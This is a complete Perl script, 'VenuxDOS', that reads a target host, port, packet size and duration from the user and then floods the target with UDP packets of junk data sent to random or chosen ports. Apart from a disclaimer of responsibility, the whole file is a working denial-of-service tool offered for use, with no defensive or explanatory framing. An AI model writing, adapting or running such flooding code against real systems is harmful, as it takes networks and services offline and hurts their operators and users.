#!/usr/bin/perl

#author: MagiKarp
#name: VenuxDOS
#WARNING: I do not take any responsibility about the usage of the script!!

use Socket;
use strict;

print("+-------------------+\n");
print("|  VeNuxDOS Script  |\n");
print("|    developed by   |\n");
print("|      MagiKarp     |\n");
print("+-------------------+\n");

print("Host: ");
my $ip = <STDIN>;
chomp $ip;

print("Port (type 0 for random port): ");
my $port = <STDIN>;
chomp $port;

print("Size (type 0 for random size): ");
my $size = <STDIN>;
chomp $size;

print("Time (type 0 for infinite time): ");
my $time = <STDIN>;
chomp $time;

my ($iaddr,$endtime,$rsize,$rport);

$iaddr = inet_aton("$ip") or die "Unknown Hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print("VeNuxDOS.pl -> Flooding ip: ".$ip."; port: ".($port ? $port : "random")."; size: ".($size ? "$size-byte" : "random")."; time: ".($time ? "$time" : "infinite")."\n");
print "Stop the flood with: Ctrl+C\n";

for (;time() <= $endtime;){
        $rsize = $size ? $size : int(rand(1024-64)+64);
        $rport = $port ? $port : int(rand(65500))+1;

        send(flood, pack("a$rsize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa"), 0, pack_sockaddr_in($rport, $iaddr));

}
